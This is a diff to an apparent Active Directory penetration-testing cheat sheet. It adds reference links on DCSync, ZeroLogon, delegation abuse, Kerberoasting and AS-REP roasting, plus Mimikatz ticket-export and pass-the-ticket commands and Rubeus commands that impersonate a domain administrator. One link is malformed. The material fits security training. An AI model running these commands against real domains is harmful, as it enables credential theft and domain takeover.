@@ -36,14 +36,43 @@ sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
 
-## DCSync0
+## DCSync Attack
+
+* [Mimikatz DCSync Usage, Exploitation, and Detection](https://adsecurity.org/?p=1729) 
+* [DC Sync Attacks With Secretsdump.py](https://youtu.be/QfyZQDyeXjQ)
 
 ## ZeroLogon (CVE-2020-1472)
 
+* [CrowdStrike's Guide to ZeroLogon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/)
+* [TheCyberMentor's Video](https://www.youtube.com/watch?v=6xMGsdD-ArI/)
+
 ## Unconstrained delegation
 
-## constrained Delegation
+* [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
 
-## SET-SPN - Kerberoast
+```powershell
+mimikatz# sekurlsa::tickets
+mimikatz# mimikatz::tickets /export
+mimikatz# kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[0;3c785]-2-0-40e10000-Administrator@krbtgt-OFFENSE.LOCAL.kirbi
+```
+
+
+## Constrained Delegation
+
+```powershell
+PS C:\> Rubeus.exe tgtdeleg
+
+# ticket is the base64 ticket we get with `rubeus's tgtdeleg`
+Rubeus.exe s4u /ticket:doIFCDC[...]TE9DQUw= /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
+```
+
+## Kerberoasting
+
+* [Attack Tutorial: Kerberoasting](https://youtu.be/beRDcvBwTBw)
+* [Active Directory - Kerberoasting by Conda](https://youtu.be/-3MxoxdzFNI)
+* [Kerberoasting Explained | Kerberos Authentication](https://youtu.be/ajOr4pcx6T0)
 
 ## ASPRoasting
+
+* [Harmjoy's Roasting AS-REPs Tutorial](http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
+* [CRACKING ACTIVE DIRECTORY PASSWORDS WITH AS-REP ROASTING](CRACKING ACTIVE DIRECTORY PASSWORDS WITH AS-REP ROASTING)
